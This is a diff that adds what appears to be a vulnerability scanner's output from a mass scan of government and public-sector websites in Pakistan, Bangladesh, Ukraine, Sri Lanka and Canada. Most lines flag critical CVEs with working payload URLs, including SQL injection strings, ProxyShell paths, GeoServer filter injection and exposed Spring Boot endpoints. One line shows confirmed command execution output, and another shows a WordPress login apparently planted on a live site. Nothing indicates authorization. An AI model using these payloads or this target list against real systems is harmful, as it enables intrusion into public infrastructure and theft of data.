@@ -1,0 +1,165 @@
+[CVE-2022-1162] [http] [critical] https://gitlab.pitb.gov.pk/users/sign_in [f8ba2470fbf1e30f2ce64d34705b8e6615ac964ea84163c8a6adaaf8a91f9eac]
+[CVE-2022-0735] [http] [critical] https://gitlab.pitb.gov.pk/users/sign_in [f8ba2470fbf1e30f2ce64d34705b8e6615ac964ea84163c8a6adaaf8a91f9eac]
+[INF] Skipped mail.pakp.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped www.avls.punjabpolice.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped mail.cpsp.edu.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped www.cpsp.edu.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped www.toolkit.punjabpolice.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped complaints.punjabpolice.gov.pk:80 from target list as found unresponsive 30 times
+[INF] Skipped cpsp.edu.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped officers16.punjabpolice.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped pms.punjabpolice.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped listing.cpsp.edu.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped ppmt.punjabpolice.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped lesco.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped library.cpsp.edu.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped admin.cpsp.edu.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped legalaffairs.punjabpolice.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped dcr.punjabpolice.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped cms.punjabpolice.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped conf.fwo.com.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped avls.punjabpolice.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped beatbook.punjabpolice.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped elm.punjabpolice.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped elm2.punjabpolice.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped elogbook.cpsp.edu.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped www.elm.punjabpolice.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped ecert.cpsp.edu.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped eportal.cpsp.edu.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped eforms.cpsp.edu.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped www.legalaffairs.punjabpolice.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped www.lesco.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped toolkit.punjabpolice.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped exam.cpsp.edu.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped trs.punjabpolice.gov.pk:443 from target list as found unresponsive 31 times
+[CVE-2022-1386] [http] [critical] https://www.nimlahore.gov.pk/wp-admin/admin-ajax.php
+[INF] Skipped webdisk.rndfkp.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped ecbs.ntp.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped fileserver.ecbs.ntp.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped docker.ecbs.ntp.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped identity.ecbs.ntp.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped campaign.ecbs.ntp.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped place.ecbs.ntp.gov.pk:443 from target list as found unresponsive 30 times
+[CVE-2023-0600] [http] [critical] https://cpanel.dmc.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://cpanel.districtcourtsorakzai.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[INF] Skipped portainer.ecbs.ntp.gov.pk:443 from target list as found unresponsive 30 times
+[CVE-2023-0600] [http] [critical] https://cpanel.job.peshawarhighcourt.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://cpanel.kpcpwc.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://cpanel.kpimu.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[INF] Skipped screening-form.ecbs.ntp.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped cpcontacts.rndfkp.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped traefik.ecbs.ntp.gov.pk:443 from target list as found unresponsive 30 times
+[CVE-2023-0600] [http] [critical] https://gujranwala.dc.lhc.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://webmail.dmc.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://webmail.ipcih.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://webmail.jobs.peshawarhighcourt.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://webmail.ikdpeshawar.gkp.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://webmail.rbcsukkur.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://webmail.rfslswat.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://webmail.slot-server-malaysia.kpcpwc.gov.pk/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=576534%27,sleep(6),0,0,0,0,0);--+-
+[INF] Skipped mail.rndfkp.gov.pk:443 from target list as found unresponsive 30 times
+[INF] Skipped rndfkp.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped webmail.rndfkp.gov.pk:443 from target list as found unresponsive 31 times
+[INF] Skipped cpcalendars.rndfkp.gov.pk:443 from target list as found unresponsive 30 times
+[CVE-2023-33584] [http] [critical] https://piouser.rti.gov.pk/enrollment/index.php?page=home
+[CVE-2021-3129] [http] [critical] https://fima.gov.bd/_ignition/execute-solution [uid=737(dbhb0pmo) gid=726(dbhb0pmo) groups=726(dbhb0pmo)]
+[CVE-2021-34473] [http] [critical] https://mail.pbi.gov.bd/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
+[CVE-2021-34473] [http] [critical] https://mail.pbi.gov.bd/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
+[INF] Skipped www.dhakasouthcity.gov.bd:443 from target list as found unresponsive 30 times
+[INF] Skipped fs.zhit.gp.gov.ua:443 from target list as found unresponsive 30 times
+[CVE-2021-40908] [http] [critical] https://register.gameapp.gov.bd/classes/Login.php?f=login
+[CVE-2021-40908] [http] [critical] https://www.register.gameapp.gov.bd/classes/Login.php?f=login
+[INF] Skipped old.vaas.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped mail.zakarpat-ses.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped www.osvita.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped www.pmsd.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped vaas.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped vn.ukrstat.gov.ua:443 from target list as found unresponsive 30 times
+[CVE-2022-0169] [http] [critical] https://nptccd.health.gov.lk/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0[]=)%22%20union%20select%201,2,3,4,5,6,7,concat(md5(999999999),%200x2c,%208),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20--%20g
+[INF] Skipped webdisk.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped mail.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped webmail.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped osvita.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped www.vaas.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped krasyliv-rda.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped www.krasyliv-rda.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped www.nodmr.gov.ua:443 from target list as found unresponsive 30 times
+[CVE-2022-0169] [http] [critical] https://www.nptccd.health.gov.lk/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0[]=)%22%20union%20select%201,2,3,4,5,6,7,concat(md5(999999999),%200x2c,%208),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20--%20g
+[INF] Skipped cpcalendars.zv.gov.ua:443 from target list as found unresponsive 30 times
+[CVE-2022-0735] [http] [critical] https://git.dev-kizv.kyivland.gov.ua/users/sign_in [a8bf3d1210afa873d9b9af583e944bdbf5ac7c8a63f6eccc3d6795802bd380d2]
+[INF] Skipped pmsd.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped www.vn.ukrstat.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped cpcontacts.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped www.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped cpanel.zv.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped zakarpat-ses.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped www.zakarpat-ses.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped irpinosvita.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped nodmr.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped ial.irpinosvita.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped lastivka.irpinosvita.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped lisova.irpinosvita.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped ilit.irpinosvita.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped radist.irpinosvita.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped sonechko.irpinosvita.gov.ua:443 from target list as found unresponsive 30 times
+[CVE-2022-1386] [http] [critical] https://crelic-lged.gov.bd/wp-admin/admin-ajax.php
+[CVE-2022-1386] [http] [critical] https://ipp.gov.ua/wp-admin/admin-ajax.php
+[INF] Skipped book.ipiend.gov.ua:443 from target list as found unresponsive 30 times
+[CVE-2022-22947] [http] [critical] https://api.ipemis.dpe.gov.bd/actuator/gateway/routes/2YzaH5NfyqBR0qfrhQIem1qu6W4
+[INF] Skipped journal.sops.gov.ua:443 from target list as found unresponsive 30 times
+[CVE-2022-29464] [http] [critical] https://dev-is.mis.slaasmb.gov.lk/authenticationendpoint/2yzagv8cqnvnqmgmtrtxz1lzylx.jsp
+[CVE-2022-29464] [http] [critical] https://dev.is-citizen.forms.lgcc.gov.lk/authenticationendpoint/2yzagv8cqnvnqmgmtrtxz1lzylx.jsp
+[CVE-2022-29464] [http] [critical] https://is.mis.slaasmb.gov.lk/authenticationendpoint/2yzagv8cqnvnqmgmtrtxz1lzylx.jsp
+[CVE-2022-29464] [http] [critical] https://qa-is.mis.slaasmb.gov.lk/authenticationendpoint/2yzagv8cqnvnqmgmtrtxz1lzylx.jsp
+[CVE-2022-29464] [http] [critical] https://stg-is-gov-agency.forms.gov.lk/authenticationendpoint/2yzagv8cqnvnqmgmtrtxz1lzylx.jsp
+[INF] Skipped www.utcc.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped utcc.gov.ua:443 from target list as found unresponsive 30 times
+[CVE-2023-0600] [http] [critical] https://cpanel.kamenkamr.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://cpanel.zrda.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://davr.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://dms.basbmed.gov.bd/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://mogylivskaotg.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://muzykivskaotg.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://nvotg.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://oleksandrivskaotg.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://rada-uzhgorod.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://saee.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://sofotg.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://sosnitsa-rada.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-0600] [http] [critical] https://www.saee.gov.ua/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=710997%27,sleep(6),0,0,0,0,0);--+-
+[CVE-2023-25157] [http] [critical] http://ceip-bwdb.gov.bd/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=desh:MYM_MYM_MYM_116_000_RS_NG&CQL_FILTER=strStartswith(geom,%27%27%27%27)=true
+[CVE-2023-25157] [http] [critical] http://mail.ceip-bwdb.gov.bd/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=land:District_BND&CQL_FILTER=strStartswith(geom,%27%27%27%27)=true
+[CVE-2023-25157] [http] [critical] http://mail.pkcp.gov.bd/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=desh:Upazila_BND&CQL_FILTER=strStartswith(geom,%27%27%27%27)=true
+[CVE-2023-25157] [http] [critical] http://pkcp.gov.bd/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=bets:CHA_CUM_CHA_114_001_RS_NG&CQL_FILTER=strStartswith(geom,%27%27%27%27)=true
+[CVE-2023-25157] [http] [critical] http://webmail.pkcp.gov.bd/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=pkcp:Plot_BND&CQL_FILTER=strStartswith(geom,%27%27%27%27)=true
+[CVE-2023-29622] [http] [critical] https://register.gameapp.gov.bd/classes/Login.php?f=login
+[CVE-2023-25157] [http] [critical] http://www.ceip-bwdb.gov.bd/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=bets:CHA_CUM_CHA_114_001_RS_LG&CQL_FILTER=strStartswith(geom,%27%27%27%27)=true
+[CVE-2023-25157] [http] [critical] http://www.pkcp.gov.bd/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=pkcp:Patharghata_SPZ&CQL_FILTER=strStartswith(geom,%27%27%27%27)=true
+[CVE-2023-29622] [http] [critical] https://www.register.gameapp.gov.bd/classes/Login.php?f=login
+[CVE-2023-33584] [http] [critical] https://communaute-financiere.canada.ca/enrollment/index.php?page=home
+[CVE-2023-33584] [http] [critical] https://finance-community.canada.ca/enrollment/index.php?page=home
+[CVE-2023-3460] [http] [critical] https://www.congress.gov.ua/. [WP_USERNAME: ZfroEt,WP_PASSWORD: uQL1P6UC]
+[INF] Skipped cpanel.osvita.bahmutrada.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped mail.osvita.bahmutrada.gov.ua:443 from target list as found unresponsive 30 times
+[INF] Skipped osvita.bahmutrada.gov.ua:443 from target list as found unresponsive 30 times
+[CVE-2023-49103] [http] [critical] https://owncloud.itc.gov.ua/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/5HEm.css
+[CVE-2023-49103] [http] [critical] https://owncloud.rada-uzhgorod.gov.ua/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/JLYp.css
+[CVE-2023-49103] [http] [critical] https://vaccination-dev.meddata.gov.ua/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/hCTX.css
+[CVE-2023-49103] [http] [critical] https://www.owncloud.rada-uzhgorod.gov.ua/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/BhXt.css
+[CVE-2023-49103] [http] [critical] https://www.owncloud.itc.gov.ua/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/4Txe.css
+[springboot-heapdump] [http] [critical] https://api.ipemis.dpe.gov.bd/actuator/heapdump
+[elfinder-version] [http] [critical] https://backend.berezan-rada.gov.ua/js/elfinder.min.js [2.1.57]
+[springboot-heapdump] [http] [critical] https://ipemis.dpe.gov.bd/actuator/heapdump
+[springboot-heapdump] [http] [critical] https://login.ipemis.dpe.gov.bd/actuator/heapdump
+[springboot-heapdump] [http] [critical] https://ops.ipemis.dpe.gov.bd/actuator/heapdump
+[elfinder-version] [http] [critical] https://www.backend.berezan-rada.gov.ua/js/elfinder.min.js [2.1.57]
+[springboot-heapdump] [http] [critical] https://ttms.dpe.gov.bd/actuator/heapdump
+[error-based-sql-injection:MySQL] [http] [critical] https://communaute-financiere.canada.ca/' [SQL syntax; check the manual that corresponds to your MySQL,check the manual that corresponds to your MySQL server version]
+[error-based-sql-injection:MySQL] [http] [critical] https://finance-community.canada.ca/' [SQL syntax; check the manual that corresponds to your MySQL,check the manual that corresponds to your MySQL server version]
+
+[springboot-h2-db-rce] [http] [critical] https://ipemis.dpe.gov.bd/actuator/env
+[springboot-h2-db-rce] [http] [critical] https://login.ipemis.dpe.gov.bd/actuator/env
+[springboot-h2-db-rce] [http] [critical] https://ops.ipemis.dpe.gov.bd/actuator/env
+
+[CVE-2020-1938] [tcp] [critical] bsp.brta.gov.bd:8009
